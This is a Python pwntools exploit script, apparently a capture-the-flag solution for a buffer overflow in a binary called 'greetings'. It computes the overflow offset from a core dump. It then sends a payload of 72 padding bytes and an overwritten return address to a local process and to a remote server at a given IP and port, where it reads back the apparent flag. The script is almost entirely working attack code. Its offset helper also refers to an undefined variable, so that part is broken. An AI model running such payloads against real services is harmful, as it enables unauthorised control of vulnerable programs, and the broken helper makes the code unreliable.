#!/usr/bin/env python3

"""
references
- https://0xrick.github.io/binary-exploitation/bof3/
- https://0xrick.github.io/binary-exploitation/bof4/
- https://medium.com/@two06/solving-a-simple-buffer-overflow-with-pwntools-575a37e4ddb1
- https://docs.pwntools.com/en/stable/elf/corefile.html
- https://samsclass.info/127/proj/ED402.htm
"""

from pwn import *
import IPython

def offset():
    io = process('./greetings')
    print(io.recvregex(b':'))
    #io.sendline(b'A'*500 + b'\xd2\x11@\x00\x00\x00\x00\x00')
    io.sendline(cyclic(100))
    io.wait()
    core = io.corefile
    #IPython.embed()
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rsp_offset = cyclic_find(pattern)
    info("rip offset is %d", rip_offset)
    print(io.recvline())
    print(io.recvline())

def pwn():
    io = process('./greetings')
    print(io.recvregex(b':'))
    payload = b'A'*72 + b'\xd2\x11@\x00\x00\x00\x00\x00'
    io.sendline(payload)
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())

def pwn_remote(ip='20.126.227.19', port='57005'):
    io = pwnlib.tubes.remote.remote(ip, port)
    print(io.recvregex(b':'))
    payload = b'A'*72 + b'\xd2\x11@\x00\x00\x00\x00\x00'
    io.sendline(payload)
    time.sleep(1)
    print(io.recvregex(b'}'))

#offset()
#pwn()
pwn_remote()